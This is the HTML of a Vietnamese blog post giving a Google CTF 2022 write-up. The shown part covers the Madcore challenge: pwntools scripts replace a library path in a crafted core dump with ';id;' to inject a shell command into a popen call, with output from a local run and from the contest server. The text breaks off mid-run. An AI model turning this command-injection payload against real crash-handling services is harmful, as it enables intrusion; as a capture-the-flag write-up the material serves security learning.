    "@type": "Organization",
    "name": "pivik",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pivik271.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://pivik271.github.io/" accesskey="h" title="pivik (Alt + H)">pivik</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://pivik271.github.io/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://pivik271.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://pivik271.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      Google CTF - Madcore, Fixedaslr
    </h1>
    <div class="post-meta"><span title='2022-07-04 01:33:51 +0700 +07'>July 4, 2022</span>&nbsp;·&nbsp;14 min

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#madcore" aria-label="Madcore:">Madcore:</a><ul>
                        
                <li>
                    <a href="#overview" aria-label="Overview">Overview</a></li>
                <li>
                    <a href="#generate-core-dump" aria-label="Generate core dump">Generate core dump</a></li>
                <li>
                    <a href="#finding-the-bug" aria-label="Finding the bug">Finding the bug</a></li>
                <li>
                    <a href="#command-injection" aria-label="Command injection">Command injection</a></li>
                <li>
                    <a href="#final-script" aria-label="Final script">Final script</a></li></ul>
                </li>
                <li>
                    <a href="#fixedaslr" aria-label="Fixedaslr:">Fixedaslr:</a><ul>
                        
                <li>
                    <a href="#overview-1" aria-label="Overview">Overview</a></li>
                <li>
                    <a href="#finding-the-bug-1" aria-label="Finding the bug">Finding the bug</a></li>
                <li>
                    <a href="#oob" aria-label="Oob">Oob</a></li>
                <li>
                    <a href="#ropchain" aria-label="Ropchain">Ropchain</a></li>
                <li>
                    <a href="#final-script-1" aria-label="Final script">Final script</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.</p>
<p>Các binary với solve script mình sẽ để ở <a href="https://github.com/pivik271/ctf-writeups/tree/main/2022/GoogleCTF">đây</a>.</p>
<h1 id="madcore">Madcore:<a hidden class="anchor" aria-hidden="true" href="#madcore">#</a></h1>
<ul>
<li>Category: pwn</li>
<li>Points: 256</li>
<li>Solves: 30</li>
<li>Description: My coredump helper is crashing while handling a crash : (</li>
</ul>
<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
<p>Những việc mình thường làm đầu tiên khi chơi pwn &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ file madcore 
</span></span><span style="display:flex;"><span>madcore: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>GNU/Linux<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>ee34abf2786eb52f2099eed9200e596f9254343b, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ checksec madcore
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/pi/CTF/google_ctf/madcore&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ 
</span></span></code></pre></div><p>Tiếp theo thì mở IDA lên và</p>
<p><img loading="lazy" src="/posts/googlectf2022/img1.png" alt="img"  />
</p>
<p>Bome rồi, c++. Đọc sơ qua thì có vẻ chương trình nhận vào 1 file core dump rồi xử lí gì đó.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000000LL</span>;
</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x1000000uLL</span>);
</span></span><span style="display:flex;"><span>  memset(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1000000uLL</span>);
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)s;
</span></span><span style="display:flex;"><span>  v23 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; size; printf(<span style="color:#e6db74">&#34;Read %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)i) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, buf, size);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">-=</span> i;
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">+=</span> i;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Lúc này mình quyết định không làm nữa và nhảy qua bài <code>Fixedaslr</code>.</p>
<h2 id="generate-core-dump">Generate core dump<a hidden class="anchor" aria-hidden="true" href="#generate-core-dump">#</a></h2>
<p>Sau khi sml với <code>Fixedaslr</code> thì mình cũng đã trở lại rồi đây. Okay lúc này mình quyết định tạo thử 1 file core dump, dựa theo link <a href="https://www.ibm.com/support/pages/how-generate-core-dump-files">này</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ ulimit -c unlimited
</span></span></code></pre></div><p>Mình cũng chuyển location của file core dump về 1 thư mục khác luôn để dễ debug.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ sudo sysctl -w kernel.core_pattern<span style="color:#f92672">=</span>/home/pi/CTF/google_ctf/coredump/core_%e_%p
</span></span></code></pre></div><p>Tiếp theo thì mình tạo 1 file c để tạo core dump.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x20</span>];
</span></span><span style="display:flex;"><span>    gets(buf);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ gcc -o test test.c
</span></span><span style="display:flex;"><span>test.c: In <span style="color:#66d9ef">function</span> ‘main’:
</span></span><span style="display:flex;"><span>test.c:5:5: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘gets’; did you mean ‘fgets’? <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">5</span> |     gets<span style="color:#f92672">(</span>buf<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>      |     ^~~~
</span></span><span style="display:flex;"><span>      |     fgets
</span></span><span style="display:flex;"><span>/usr/bin/ld: /tmp/ccmvs0wy.o: in <span style="color:#66d9ef">function</span> <span style="color:#e6db74">`</span>main<span style="color:#e6db74">&#39;:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">test.c:(.text+0x28): warning: the `gets&#39;</span> <span style="color:#66d9ef">function</span> is dangerous and should not be used.
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ ./test 
</span></span><span style="display:flex;"><span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span></span><span style="display:flex;"><span>*** stack smashing detected ***: terminated
</span></span><span style="display:flex;"><span>Aborted <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ cd coredump/
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf/coredump $ ls
</span></span><span style="display:flex;"><span>core_test_6040
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf/coredump $ file core_test_6040 
</span></span><span style="display:flex;"><span>core_test_6040: ELF 64-bit LSB core file, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, SVR4-style, from <span style="color:#e6db74">&#39;./test&#39;</span>, real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: <span style="color:#e6db74">&#39;./test&#39;</span>, platform: <span style="color:#e6db74">&#39;x86_64&#39;</span>
</span></span></code></pre></div><p>Có được file core dump rồi thì mình viết 1 script python để test thử chương trình.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./madcore&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./coredump/core_test_6040&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    core_dump <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> core_dump
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x1000000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;FINISHED READING.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ python3 test.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./madcore&#39;</span>: pid <span style="color:#ae81ff">6301</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;backtrace&#34;</span>:<span style="color:#f92672">[[</span>0,<span style="color:#e6db74">&#34;&lt;unknown&gt;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>45524,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>993956,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>501318,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>505870,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>107638,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>2035,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]]</span>,<span style="color:#e6db74">&#34;modules&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/home/pi/CTF/google_ctf/test&#34;</span>,<span style="color:#e6db74">&#34;/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&#34;</span><span style="color:#f92672">]}[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span><span style="display:flex;"><span>$ 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./madcore&#39;</span> stopped with exit code <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>pid 6301<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="finding-the-bug">Finding the bug<a hidden class="anchor" aria-hidden="true" href="#finding-the-bug">#</a></h2>
<p>Sau khi chạy thử đoạn test ở trên, mình có để ý dòng <code>sh: 1: llvm-symbolizer: not found</code>. Điều này có nghĩa là trong chương trình có thực thi lệnh <code>llvm-symbolizer</code>, nhưng trên local mình không có nên mới có dòng đó.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ which llvm-symbolizer
</span></span><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ 
</span></span></code></pre></div><p>Nếu bạn nào chơi ctf nhiều, sau khi thấy dòng system command được thực thi, thì chắc cũng đoán được điều gì rồi.</p>
<p>Yep, mình có nghĩ tới command injection, nhưng lúc này mình vẫn chưa chắc, với cũng không vội, nên mình ngồi reverse sơ qua binary. Sau khi ngồi khoảng 4-5 tiếng đồng hồ vừa reverse vừa tìm bug, thì mình tình cờ tìm đến được hàm này.</p>
<p><img loading="lazy" src="/posts/googlectf2022/img2.png" alt="img"  />
</p>
<p><img loading="lazy" src="/posts/googlectf2022/img3.png" alt="img"  />
</p>
<h2 id="command-injection">Command injection<a hidden class="anchor" aria-hidden="true" href="#command-injection">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> a2[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)Binary<span style="color:#f92672">::</span>GetFileName((Binary <span style="color:#f92672">*</span>)a2[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    v14 <span style="color:#f92672">=</span> snprintf(<span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#e6db74">&#34;%s --obj=%s %p&#34;</span>, <span style="color:#f92672">*</span>a2, v4, v3);
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)malloc(v14 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> a2[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)Binary<span style="color:#f92672">::</span>GetFileName((Binary <span style="color:#f92672">*</span>)a2[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    snprintf(s, v14 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;%s --obj=%s %p&#34;</span>, <span style="color:#f92672">*</span>a2, v6, v5);
</span></span><span style="display:flex;"><span>    stream <span style="color:#f92672">=</span> popen(s, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span></code></pre></div><p>Huh popen? Lúc này mình mới nhớ về ý tưởng command injection ban đầu. Nếu mình điều khiển được <code>s</code> thì mọi chuyện sẽ xong. Ở dòng <code>snprintf(s, v14 + 1, &quot;%s --obj=%s %p&quot;, *a2, v6, v5);</code>, mình để ý thấy <code>v6 = (const char *)Binary::GetFileName((Binary *)a2[2]);</code> có vẻ là một ứng viên để điều khiển. Lúc này mình debug thử xem <code>v6</code> là gì.</p>
<p><img loading="lazy" src="/posts/googlectf2022/img4.png" alt="img"  />
</p>
<p>Thanh ghi <code>R8</code> chính là tham số thứ 5 được truyền vào hàm, cũng chính là <code>v6</code>. Hmm <code>v6</code> lúc này là chuỗi <code>/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</code>, vậy nếu mình replace chuỗi này trong file core dump thành 1 command thì sao?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./madcore&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>to_replace <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;id;&#39;</span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> cmd<span style="color:#f92672">.</span>ljust(len(to_replace), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./coredump/core_test_6040&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    core_dump <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    core_patched <span style="color:#f92672">=</span> core_dump<span style="color:#f92672">.</span>replace(to_replace, cmd)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> core_patched
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x1000000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;FINISHED READING.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img loading="lazy" src="/posts/googlectf2022/img5.png" alt="img"  />
</p>
<p>Okay vậy là mình đã thay đổi chuỗi ở trên thành command <code>id</code>, chạy thử xem thế nào.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ python3 test.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./madcore&#39;</span>: pid <span style="color:#ae81ff">6821</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span>sh: 1: llvm-symbolizer: not found
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;backtrace&#34;</span>:<span style="color:#f92672">[[</span>0,<span style="color:#e6db74">&#34;&lt;unknown&gt;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>45524,<span style="color:#e6db74">&#34;uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),99&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>993956,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>501318,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>505870,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>107638,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>2035,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]]</span>,<span style="color:#e6db74">&#34;modules&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/home/pi/CTF/google_ctf/test&#34;</span>,<span style="color:#e6db74">&#34;;id;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span><span style="color:#f92672">]}[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span><span style="display:flex;"><span>$ 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./madcore&#39;</span> stopped with exit code <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>pid 6821<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Yay vậy là ý tưởng command injection thực hiện được. Mình mới chạy thử trên server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ python3 test.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;backtrace&#34;</span>:<span style="color:#f92672">[[</span>0,<span style="color:#e6db74">&#34;&lt;unknown&gt;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>45524,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>993956,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>501318,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>505870,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>107638,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]</span>,<span style="color:#f92672">[</span>2035,<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">]]</span>,<span style="color:#e6db74">&#34;modules&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/home/pi/CTF/google_ctf/test&#34;</span>,<span style="color:#e6db74">&#34;/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,<span style="color:#e6db74">&#34;;id;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span><span style="color:#f92672">]}[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span><span style="display:flex;"><span>$ 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to madcore.2022.ctfcompetition.com port <span style="color:#ae81ff">1337</span>
</span></span></code></pre></div><p>Ủa gì dọ, output của toi đou?</p>
<p><img loading="lazy" src="/posts/googlectf2022/img6.jpg" alt="img"  />
</p>
<p>Thật sự thì lúc này mình cũng không biết sao trên server lại không chạy được. Để chắc chắn command injection vẫn hoạt động, mình mới test một vài command khác. Sau 1 lúc test mình thấy command <code>echo /*</code> cho ra output.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pi@vik: ~/CTF/google_ctf $ python3 test.py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
